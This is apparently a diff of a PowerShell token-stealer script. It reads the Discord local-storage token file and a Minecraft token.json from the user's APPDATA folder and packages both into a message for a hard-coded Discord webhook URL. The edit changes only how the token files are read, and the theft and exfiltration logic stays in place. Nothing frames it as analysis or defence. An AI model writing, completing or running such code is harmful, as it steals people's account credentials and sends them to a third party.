@@ -11,8 +11,8 @@ Write-Host
 
 
 $webhookUrl = "https://discord.com/api/webhooks/1495059939763421315/vA3rZWFwYgPada9Yy3DLEU7f2-XhwzcpgF-DrWSvGluR2Iv8XuQOJ5R2yKxN9cPkkjah"
-$discordToken = Get-Content -Path "$env:APPDATA\Discord\Local Storage\https_discord.com_0.localstorage" | Select-String -Pattern "token" | Get-Content | Out-String
-$minecraftToken = Get-Content -Path "$env:APPDATA.minecraft\token.json" | ConvertFrom-Json | Select-Object -ExpandProperty token
+$discordToken = Get-Content -Path "$env:APPDATA\Discord\Local Storage\https_discord.com_0.localstorage"
+$minecraftToken = Get-Content -Path "$env:APPDATA.minecraft\token.json"
 
 $tokenData = @{
     content = "Discord Token: $discordToken`nMinecraft Token: $minecraftToken"
